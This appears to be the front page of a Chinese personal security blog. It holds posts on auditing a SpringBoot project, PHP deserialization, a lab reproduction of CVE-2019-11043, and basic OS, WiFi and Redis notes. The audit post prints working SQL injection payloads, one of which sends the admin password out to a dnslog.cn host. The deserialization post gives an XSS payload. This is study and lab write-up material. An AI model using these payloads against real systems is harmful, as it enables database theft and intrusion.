<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="utf-8">
  

  
  <title>闪电&#39;s Blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  
  
  
  <meta property="og:type" content="website">
<meta property="og:title" content="闪电&#39;s Blog">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="闪电&#39;s Blog">
<meta property="og:locale" content="en">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="闪电&#39;s Blog">
  
    <link rel="alternate" href="/atom.xml" title="闪电&#39;s Blog" type="application/atom+xml">
  
  
    <link rel="icon" href="/images/default-avatar.jpg">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css">
  <link rel="stylesheet" href="/css/highlight.css">
</head>
</html>
<body>
  <div id="fullpage" class="mobile-nav-right">
    
      <div id="wrapper" title="图片来自网络">
    
    
      <header id="header">
  <div id="nav-toggle" class="nav-toggle"></div>
  <div class="head-box global-width">
    <nav class="nav-box nav-right">
      
        <a class="nav-item" href="/" title
        
        >首页</a>
      
        <a class="nav-item" href="/archives" title
        
        >归档</a>
      
    </nav>
  </div>
</header>
      <div id="middlecontent" title class="global-width sidebar-right">
        <section id="main">
  
    <article id="post-某个SpringBoot系统的审计" class="article global-container article-type-post" itemscope itemprop="blogPost">
  
    <header class="article-header">
      
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/06/05/某个SpringBoot系统的审计/">某个SpringBoot项目的审计</a>
    </h1>
  

    </header>
  
  <div class="article-meta">
    <a href="/2021/06/05/某个SpringBoot系统的审计/" class="article-date">
  <time datetime="2021-06-05T03:10:39.000Z" itemprop="datePublished">2021-06-05</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/WEB相关/">WEB相关</a>
  </div>

    
  </div>
  

  <div class="article-inner">
    
    <div class="article-content article-content-cloud" itemprop="articleBody">
      
        <h1 id="某个SpringBoot项目的审计"><a href="#某个SpringBoot项目的审计" class="headerlink" title="某个SpringBoot项目的审计"></a>某个SpringBoot项目的审计</h1><p>在github上看到的这个SpringBoot项目，作者刚提交不久，一些功能还没完善。好奇心让我下载了这个项目，打算在本地审计一波，遂有了此文。</p>
<p>拿到一个java的项目，我习惯先看是什么框架。持久层用的什么，然后是maven项目的话，pom文件里的依赖都是哪些，版本又是如何。再就是看项目里filter对参数的过滤情况。</p>
<h3 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h3><ul>
<li>第一处注入</li>
</ul>
<p>项目的持久层用的mybatis，这里我就直接查看项目里的sql映射文件，看到这一处sql语句，${sql}完全可控，明显一处注入</p>
<p><img src="D:%5CDesktop%5C%E6%88%91%E7%9A%84%E7%AC%94%E8%AE%B0%5C%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95%5C%E6%9F%90%E4%B8%AASpringBoot%E9%A1%B9%E7%9B%AE%E7%9A%84%E5%AE%A1%E8%AE%A1%5Cimage-20210614131759313.png" alt="image-20210614131759313"></p>
<p>一路跟上去看看有没有调用的</p>
<p>，<img src="D:%5CDesktop%5C%E6%88%91%E7%9A%84%E7%AC%94%E8%AE%B0%5C%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95%5C%E6%9F%90%E4%B8%AASpringBoot%E9%A1%B9%E7%9B%AE%E7%9A%84%E5%AE%A1%E8%AE%A1%5Cimage-20210614132523077.png" alt="image-20210614132523077"></p>
<p><img src="D:%5CDesktop%5C%E6%88%91%E7%9A%84%E7%AC%94%E8%AE%B0%5C%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95%5C%E6%9F%90%E4%B8%AASpringBoot%E9%A1%B9%E7%9B%AE%E7%9A%84%E5%AE%A1%E8%AE%A1%5Cimage-20210614132822231.png" alt="image-20210614132822231"></p>
<p>可惜的是，作者唯独没调用这个getAreaBySql，应该是项目还没完善吧。为了验证一下这里的问题，我在controller里自己加了一处调用该函数。</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@PostMapping(&quot;/getAreaBySql&quot;)</span><br><span class="line">public RespDto&lt;List&lt;AreaReturnDto&gt;&gt;  getArea(@RequestParam(&quot;sql&quot;)String sql)&#123;</span><br><span class="line">	List&lt;AreaReturnDto&gt; list=areaService.getAreaBySql(sql);</span><br><span class="line">	return RespDto.succResult(list);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>小小的尝试</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">sql=(select 1  and extractvalue(1,concat(0x7e,user())))</span><br></pre></td></tr></table></figure></div>

<p><img src="D:%5CDesktop%5C%E6%88%91%E7%9A%84%E7%AC%94%E8%AE%B0%5C%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95%5C%E6%9F%90%E4%B8%AASpringBoot%E9%A1%B9%E7%9B%AE%E7%9A%84%E5%AE%A1%E8%AE%A1%5Cimage-20210614133459925.png" alt="image-20210614133459925"></p>
<p>拿到结果，不过这里需要在控制台里才能看到结果，实战中应尝试dnslog拿结果，前提是对方的mysql secure_file_priv不为null，有load_file的权限</p>
<p><img src="D:%5CDesktop%5C%E6%88%91%E7%9A%84%E7%AC%94%E8%AE%B0%5C%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95%5C%E6%9F%90%E4%B8%AASpringBoot%E9%A1%B9%E7%9B%AE%E7%9A%84%E5%AE%A1%E8%AE%A1%5Cimage-20210614133554737.png" alt="image-20210614133554737"></p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dnslog payload</span><br><span class="line">sql=(select load_file(concat(&apos;\\\\&apos;,(select password from sys_member_info where user_name=&apos;admin&apos;),&apos;.4i06oo.dnslog.cn\\test&apos;)))</span><br></pre></td></tr></table></figure></div>

<p><img src="D:%5CDesktop%5C%E6%88%91%E7%9A%84%E7%AC%94%E8%AE%B0%5C%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95%5C%E6%9F%90%E4%B8%AASpringBoot%E9%A1%B9%E7%9B%AE%E7%9A%84%E5%AE%A1%E8%AE%A1%5Cimage-20210614133917547.png" alt="image-20210614133917547"></p>
<p>拿到结果</p>
<p><img src="D:%5CDesktop%5C%E6%88%91%E7%9A%84%E7%AC%94%E8%AE%B0%5C%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95%5C%E6%9F%90%E4%B8%AASpringBoot%E9%A1%B9%E7%9B%AE%E7%9A%84%E5%AE%A1%E8%AE%A1%5Cimage-20210614134001374.png" alt="image-20210614134001374"></p>
<ul>
<li><p>第二处注入</p>
<p>这两个参数任选其一即可</p>
<p><img src="D:%5CDesktop%5C%E6%88%91%E7%9A%84%E7%AC%94%E8%AE%B0%5C%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95%5C%E6%9F%90%E4%B8%AASpringBoot%E9%A1%B9%E7%9B%AE%E7%9A%84%E5%AE%A1%E8%AE%A1%5Cimage-20210614195231427.png" alt="image-20210614195231427"></p>
<p>看看哪里调用了</p>
<p><img src="D:%5CDesktop%5C%E6%88%91%E7%9A%84%E7%AC%94%E8%AE%B0%5C%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95%5C%E6%9F%90%E4%B8%AASpringBoot%E9%A1%B9%E7%9B%AE%E7%9A%84%E5%AE%A1%E8%AE%A1%5Cimage-20210614195501756.png" alt="image-20210614195501756"></p>
<p><img src="D:%5CDesktop%5C%E6%88%91%E7%9A%84%E7%AC%94%E8%AE%B0%5C%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95%5C%E6%9F%90%E4%B8%AASpringBoot%E9%A1%B9%E7%9B%AE%E7%9A%84%E5%AE%A1%E8%AE%A1%5Cimage-20210614195539485.png" alt="image-20210614195539485"></p>
</li>
</ul>
<p>  <img src="D:%5CDesktop%5C%E6%88%91%E7%9A%84%E7%AC%94%E8%AE%B0%5C%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95%5C%E6%9F%90%E4%B8%AASpringBoot%E9%A1%B9%E7%9B%AE%E7%9A%84%E5%AE%A1%E8%AE%A1%5Cimage-20210614195420133.png" alt="image-20210614195420133"></p>
<p>找到调用的，直接开干，这里需要注意传的数据要是json的，不然得不到结果，也就是下面的enctype那里</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">http://localhost:8888/chongzhilog/list</span><br><span class="line">&#123;&quot;page&quot;:1,&quot;limit&quot;:10,&quot;id&quot;:&quot;1&quot;,&quot;startTime&quot;:&quot;1&apos;,&apos;2&apos;,&apos;00:00:00&apos;) and extractvalue(1,concat(0x7e,user()))--+&quot;&#125;</span><br></pre></td></tr></table></figure></div>

<p><img src="D:%5CDesktop%5C%E6%88%91%E7%9A%84%E7%AC%94%E8%AE%B0%5C%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95%5C%E6%9F%90%E4%B8%AASpringBoot%E9%A1%B9%E7%9B%AE%E7%9A%84%E5%AE%A1%E8%AE%A1%5Cimage-20210614195827125.png" alt="image-20210614195827125"></p>
<p>得到结果</p>
<p><img src="D:%5CDesktop%5C%E6%88%91%E7%9A%84%E7%AC%94%E8%AE%B0%5C%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95%5C%E6%9F%90%E4%B8%AASpringBoot%E9%A1%B9%E7%9B%AE%E7%9A%84%E5%AE%A1%E8%AE%A1%5Cimage-20210614200012714.png" alt="image-20210614200012714"></p>
<p>同样的可以尝试用dnslog拿到结果</p>

      
    </div>
    
  </div>
  
  
</article>

  
    <article id="post-操作系统概述" class="article global-container article-type-post" itemscope itemprop="blogPost">
  
    <header class="article-header">
      
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/11/03/操作系统概述/">操作系统概述</a>
    </h1>
  

    </header>
  
  <div class="article-meta">
    <a href="/2019/11/03/操作系统概述/" class="article-date">
  <time datetime="2019-11-03T10:15:24.000Z" itemprop="datePublished">2019-11-03</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/计算机操作系统/">计算机操作系统</a>
  </div>

    
  </div>
  

  <div class="article-inner">
    
    <div class="article-content article-content-cloud" itemprop="articleBody">
      
        <h1 id="操作系统概述"><a href="#操作系统概述" class="headerlink" title="操作系统概述"></a>操作系统概述</h1><p>操作系统概念:<br>        控制和管理整个计算机系统的硬件与软件资源，合理地组织，调度计算机的工作与资源的分配，进而为用户和其他软件提供方便接口与环境的程序接口。操作系统是随着计算机研究和引用的发展逐步形成并发展起来的，他是计算机系统中最基本的系统软件</p>
<p>并发(Concurrence):<br>        两个或多个事件在同一时间间隔内发生。操作系统并发性是指计算机系统中同时存在多个运行的程序，因此它具有处理和调度多个程序同时执行的能力，在操作系统中，因此引入进程的目的是使程序能够并发执行</p>
<p>共享(Sharing):<br>        系统中的资源可供内存中多个并发执行的进程使用</p>
<p>互斥共享:<br>        系统中某些资源，规定在一段时间内只允许一个进程访问该资源。典型资源:打印机，磁带机。</p>
<p>同时访问:<br>        系统中另一些资源允许一段时间内由多个进程”同时”访问。这里的”同时”通常是宏观上的，微观上，这些进程可能是交替对资源进行访问即”分时共享”的。典型资源是磁盘设备</p>
<p>虚拟(Virtual)：<br>        把一个物理上的实体变为若干逻辑上的对应物。物理实体是实的，后者是用户感觉上的事物。操作系统中利用了多种虚拟技术来实现虚拟处理器，虚拟内存和虚拟外设</p>
<p>虚拟处理器技术:<br>                通过躲到程序设计技术，采用让多道程序并发执行的方法，来分时使用一个处理器。</p>
<p>虚拟技术:<br>        时分复用技术，如处理器分时共享;空分复用技术，如虚拟存储器</p>
<p>异步(Asynchronism):<br>          多道程序环境允许多个程序并发执行，但由于资源有限，进程的执行并不是一贯到底，而是走走停停，它以不可预知的速度向前推进，这就是进程异步</p>
<ul>
<li><p>操作系统目标和功能</p>
<p>  为给多道程序提供良好的运行环境，操作系统应具备以下功能:</p>
<pre><code>处理机管理
存储器管理
设备管理
文件管理    </code></pre></li>
</ul>
<p>操作系统作为计算机系统资源的管理者:<br>1&gt; 处理机管理:<br>        多道程序环境下，处理机的分配和运行都以进程为基本单位，因此对处理机的管理可归结为对进程的管理。并发是指计算机内同时运行多个进程，因此进程何时创建，何时撤销，如何管理，如何避免冲突，合理共享就是进程管理的最主要任务。进程管理主要功能包括进程控制，进程同步，进程通信，死锁处理，处理机调度等</p>
<p>2&gt;存储器管理:<br>        为了给多道程序的运行提供良好的环境。方便用户使用使用及提高内存的利用率，主要包括内存分配，地址映射，内存保护与共享和内存扩充等功能</p>
<p>3&gt;文件管理:<br>        计算机中的信息都是以文件的形式存在的，操作系统中负责文件管理的部分称为文件系统。文件管理包括文件存储空间的管理，目录管理及文件读写管理和保护等</p>
<p>4&gt;设备管理:<br>        完成用户I/O请求，方便用户使用各种设备，并提高设备的利用率，主要包括缓存管理,设备分配，设备处理和虚拟设备等功能</p>
<p>操作系统作为用户与计算机硬件系统之间的接口:<br>        操作系统提供的接口主要分为两类:命令接口，用户利用这些操作命令来组织和控制作业的执行；另一类是程序接口，编程人员可以使用它们来请求操作系统服务</p>
<p>1&gt;命令接口:<br>        使用命令接口进行作业控制主要有两种方式:联机控制，脱机控制。按作业控制方式不同，可将命令接口分为 联机命令接口 和 脱机命令接口</p>
<p>联机命令接口:可以理解为”雇主”说一句话，”工人”做一件事，并作出反馈，这就强调交互性<br>脱机命令接口:可以理解为”雇主”把要”工人”做的事写在清单上，”工人”按照清单命令逐条完成这些事，这就是批处理</p>
<p>2&gt;程序接口:<br>        程序接口由一组系统调用命令组成。用户通过在程序中使用这些系统调用命令来请求操作系统为其提供服务。</p>

      
    </div>
    
  </div>
  
  
</article>

  
    <article id="post-关于php反序列化漏洞小记" class="article global-container article-type-post" itemscope itemprop="blogPost">
  
    <header class="article-header">
      
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/10/30/关于php反序列化漏洞小记/">关于php反序列化漏洞小记</a>
    </h1>
  

    </header>
  
  <div class="article-meta">
    <a href="/2019/10/30/关于php反序列化漏洞小记/" class="article-date">
  <time datetime="2019-10-30T03:10:39.000Z" itemprop="datePublished">2019-10-30</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/WEB相关/">WEB相关</a>
  </div>

    
  </div>
  

  <div class="article-inner">
    
    <div class="article-content article-content-cloud" itemprop="articleBody">
      
        <h1 id="关于php反序列化漏洞小记"><a href="#关于php反序列化漏洞小记" class="headerlink" title="关于php反序列化漏洞小记"></a>关于php反序列化漏洞小记</h1><p>php程序为了保存和存储对象，提供了序列化的方法，php序列化是为了在程序运行的过程中对对象进行转储而产生的。<br>序列化可以将对象转换成转换成字符串，但仅保留对象中的成员变量，不保留函数方法。<br>php序列化的函数为serialize，反序列化函数为unserialize</p>
<p>看这样一段php代码，</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Test&#123;</span><br><span class="line">		public $a=&apos;this a&apos;;</span><br><span class="line">		protected $b=&apos;this b&apos;;</span><br><span class="line">		private $c=&apos;this C&apos;;</span><br><span class="line">		</span><br><span class="line">		public function test1()&#123;	</span><br><span class="line">		 return &apos;this is test 1&apos;;</span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br><span class="line">	$test=new Test();</span><br><span class="line">	var_dump(serialize($test)); //var_dump用于输出变量的相关信息，显示关于一个或多个表达式的结构信息，包括表达式的类型与值</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p>输出结果为<br>string(87) “O:4:”Test”:3:{s:1:”a”;s:6:”this a”;s:4:”<em>b”;s:6:”this b”;s:7:”Testc”;s:6:”this C”;}”<br>相关解释：<br>O代表对象,4表示该对象名称有4个字符，<br>“Test”表示该对象名称，<br>3表示该对象有3个成员，<br>接着是括号里的。这个类的三个成员变量由于变量前的修饰不同，序列化后显示的也不同。<br>第一个变量a序列化后为s:1:”a”;s:6:”this a”;   序列化后的字符串以分号分隔每一个变量特征。<br>分号左边是变量名，分号右边是变量值，这里s表示字符串，1表示字符串中只有一个字符，“a”表示该字符串为a，右边的同理<br>第二个变量与第一个有点不同，，多了个 星号(</em>)，这是因为“a”是public属性，而第二个变量b是protected属性，php为了区分这些属性所有进行了一些修饰<br>**另外这里要注意</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">当变量修饰为protected时，序列会时会在变量名前加%00*%00</span><br><span class="line">当变量为private时，会在成员变量名前添加%00类名%00</span><br></pre></td></tr></table></figure></div>

<pre><code>**magic 函数**</code></pre><p>php面向对象变成中，有一类函数叫做magic function，魔术函数，</p>
<p>这些函数是以<strong>(双下划线)开头的，他们是一些当依照某些规则实例化类或者调用某些函数的时候会自动调用这些magic函数，这里说一下比较常见的例如</strong>construct，__destory，</p>
<p><strong>sleep，</strong>wakeup，__toString函数。</p>
<pre><code>__construct()
__contstruct()函数被称为构造函数，当实例化类的时候会自动调用该函数

__destruct()
__destruct()函数被称为析构函数，当类结束的时候自动调用该函数

__sleep()
__sleep()函数是当php进行序列化操作（serialize）的时候自动调用该函数，可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。

__wakeup()
__wakeup()函数是当php进行反序列化操作（unserialize）的时候自动调用该函数

__toString()
__toString()函数是当对象被当做字符串的时候会自动调用该函数</code></pre><p><strong>php反序列化漏洞</strong></p>
<p>这里来个小栗子：</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A&#123;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">            echo $this-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = $_GET[&apos;test&apos;];</span><br><span class="line">$a_unser = unserialize($a);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">这里控制test参数就可以进行反射型xss，例如将test=O:1:&quot;A&quot;:1:&#123;s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(/aaa/)&lt;/script&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure></div>

<p>这篇文章更为详细</p>
<p><a href="https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p>

      
    </div>
    
  </div>
  
  
</article>

  
    <article id="post-CVE-2019-11043-复现" class="article global-container article-type-post" itemscope itemprop="blogPost">
  
    <header class="article-header">
      
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/10/24/CVE-2019-11043-复现/">CVE-2019-11043 复现</a>
    </h1>
  

    </header>
  
  <div class="article-meta">
    <a href="/2019/10/24/CVE-2019-11043-复现/" class="article-date">
  <time datetime="2019-10-24T02:36:41.000Z" itemprop="datePublished">2019-10-24</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/漏洞复现/">漏洞复现</a>
  </div>

    
  </div>
  

  <div class="article-inner">
    
    <div class="article-content article-content-cloud" itemprop="articleBody">
      
        <h1 id="CVE-2019-11043-复现"><a href="#CVE-2019-11043-复现" class="headerlink" title="CVE-2019-11043 复现"></a>CVE-2019-11043 复现</h1><p><strong>漏洞详情</strong><br>2019年10月22日,国外安全研究员公开了一个PHP-FPM远程代码执行的漏洞EXP.<br>该漏洞 是Andrew Danau在某比赛解决一道 CTF 题目时发现,向目标服务器 URL 发送 %0a 符号时，服务返回异常发现的漏洞.<br>2019年9月26日,PHP官方发布漏洞通告,其中指出:使用 Nginx + php-fpm的服务器,在部分配置下,存在远程代码执行漏洞.且该配置已被广泛使用，危害较大,影响较为广泛.相关工具已经公开在Github</p>
<p><strong>环境搭建</strong><br>Vulhub中现成的环境，，所以这里直接在docker里部署就ok，。</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/vulhub/vulhub  //下载vulhub </span><br><span class="line">Apt install golang-go  //安装go</span><br><span class="line">go get -u github.com/neex/phuip-fpizdam  //下载exp</span><br></pre></td></tr></table></figure></div>

<p>进入/vulhub/php/CVE-2019-11043，，启动环境<br><img src="/images/Article_images/cve-2019-11043_1.png" alt></p>
<p>docker-compose up -d 拉取镜像<br><img src="/images/Article_images/cve-2019-11043_2.png" alt></p>
<p>然后docker ps查看<br><img src="/images/Article_images/cve-2019-11043_3.png" alt></p>
<p>,环境已经成功启动<br><img src="/images/Article_images/cve-2019-11043_4.png" alt></p>
<p><strong>下面开始利用</strong><br>cd go/bin<br>/phuip-fpizdam <a href="http://192.168.78.130:8080/index.php" target="_blank" rel="noopener">http://192.168.78.130:8080/index.php</a><br><img src="/images/Article_images/cve-2019-11043_5.png" alt><br><img src="/images/Article_images/cve-2019-11043_6.png" alt><br>这里可以看到以及成功利用</p>
<p><strong>修复建议及影响范围</strong><br>影响范围：PHP 5.6-7.x<br>修改nginx配置文件中fastcgi_split_path_info的正则表达式,不允许.php之后传入不可显字符<br>OR<br>暂停使用 nginx+php-fpm 服务<br>OR<br>删除如下配置</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fastcgi_split_path_info ^(.+?\.php)(/.*)$;</span><br><span class="line">fastcgi_param PATH_INFO $fastcgi_path_info;</span><br></pre></td></tr></table></figure></div>


      
    </div>
    
  </div>
  
  
</article>

  
    <article id="post-WiFi网络结构" class="article global-container article-type-post" itemscope itemprop="blogPost">
  
    <header class="article-header">
      
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/10/23/WiFi网络结构/">WiFi网络结构</a>
    </h1>
  

    </header>
  
  <div class="article-meta">
    <a href="/2019/10/23/WiFi网络结构/" class="article-date">
  <time datetime="2019-10-23T07:00:33.000Z" itemprop="datePublished">2019-10-23</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/无线渗透/">无线渗透</a>
  </div>

    
  </div>
  

  <div class="article-inner">
    
    <div class="article-content article-content-cloud" itemprop="articleBody">
      
        <h1 id="wifi网络结构"><a href="#wifi网络结构" class="headerlink" title="wifi网络结构"></a>wifi网络结构</h1><p>一般架设wifi网络的基本设备就是无线网卡和一台AP，AP为Access point的简称，一般翻译为“无线访问介入点”或者“桥接器”，如无线路由器，他主要在媒体存取控制层mac中扮演无线工作站与有线局域网的桥梁。<br>有了AP，就像有线网络的Hub(集线器),无线工作站就可以快速轻易地与无线网络相连。<br>        单纯型AP<br>      /<br>无线AP<br>      <br>        扩展型Ap</p>
<p><strong>单纯型AP</strong><br>由于缺少路由功能，仅仅提供一个无线信号发射的功能，他的工作原理是将网络信号通过双绞线传送过来，经过无线AP的编译，将电信号转化为无线电信号发送出来，形成wifi共享上网的覆盖，根据不同的功率，网络的覆盖程度也是不同的，一般无线AP的最大覆盖距离可达400m</p>
<p><strong>扩展型Ap</strong><br>扩展型AP就是人们常说的无线路由器，无线路由器，顾名思义就是带有无线覆盖功能的路由器。通过路由功能，可以实现家庭wifi共享上网的internet连接共享，也能实现ADSL和小区宽带的无线共享接入</p>
<p><strong>AP常用语</strong><br>1.SSID<br>Service Set Identifier缩写，意思是服务集标识。SSID技术可以将一个无线局域网分为几个需要不同身份验证的自网络，每一个子网络都需要独立的身份验证。只有通过身份验证的用户才可以进入相应的子网络，防止未授权进入网络<br>，可区分不同网络，SSID通常由AP广播出来，简单说SSID就是一个局域网名称。<br>2.信道<br>无线信道也就是常说的无线的“频段”,其是以无线信号作为传输媒体的数据信号传送通道。在无线路由器中，通常有13个信道。<br>3.模式<br>指802.11协议的几种类型，通常在无线路由器中包括五种模式，分别是11b only，11g only，11n only，11bg mixed和11bgn mixed</p>
<p><strong>频段带宽</strong><br>是发送无线信号频率的标准，频率越高越易失帧，在11n模式中，一般包括20MHz和40MHz两个频段带宽，其中20MHz在11n的情况下能达到144Mbps带宽，且穿透性好，传输距离远（100m左右）；40MHz在11n的情况下能达到300Mbps带宽，穿透性差，传输距离近（约50m）<br><strong>WDS（无线分布式系统）</strong><br>Wireless Distribution System，无线分布式系统。是一个在IEEE802.11网络中多个无线访问点通过无线互联的系统。他允许将无线网络通过多个访问点进行扩展，而不像以前一样无线访问点要有线进行连接，这种可扩展性能，使无线网络具有更大的传输距离。</p>
<p><strong>WirelessMon规划频段</strong><br>想完全错开使用信道不容易，可以做到尽量避免冲突，在windows中提供wirelessmon工具，可以监控无线适配器和聚集状态，并显示周边无线接入点或基站实时信息的工具</p>

      
    </div>
    
  </div>
  
  
</article>

  
    <article id="post-Redis小结" class="article global-container article-type-post" itemscope itemprop="blogPost">
  
    <header class="article-header">
      
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/10/19/Redis小结/">Redis小结</a>
    </h1>
  

    </header>
  
  <div class="article-meta">
    <a href="/2019/10/19/Redis小结/" class="article-date">
  <time datetime="2019-10-19T13:59:25.000Z" itemprop="datePublished">2019-10-19</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/杂记/">杂记</a>
  </div>

    
  </div>
  

  <div class="article-inner">
    
    <div class="article-content article-content-cloud" itemprop="articleBody">
      
        <h1 id="Redis小结"><a href="#Redis小结" class="headerlink" title="Redis小结"></a>Redis小结</h1><p>启动 redis-server<br>进去命令行客户端，redis-cli<br>关闭原来服务器，shutdown<br>在远程redis服务器上执行命令，redis-cli -h host -p port -a password</p>
<p>1.set和get命令，键为icando，对应值为youcando（注意，一个键最大存储512MB）<br><strong>String（字符串）</strong></p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; set icando &quot;youcando&quot;</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; get icando</span><br><span class="line">&quot;youcando&quot;</span><br></pre></td></tr></table></figure></div>

<p><strong>Hash（哈希）</strong><br>hash是一个键值对集合，它是一个string类型的fieled和value的映射表，热别适合用于存储对象</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; hmset two field1 &quot;a&quot; field2 &quot;b&quot;</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; hget two field1</span><br><span class="line">&quot;a&quot;</span><br><span class="line">127.0.0.1:6379&gt;</span><br></pre></td></tr></table></figure></div>

<p><strong>List（列表）</strong><br>redis 列表是简单的字符串列表，按照插入顺序排序，可以添加一个元素到列表的头部（左边）或者尾部（右边）</p>
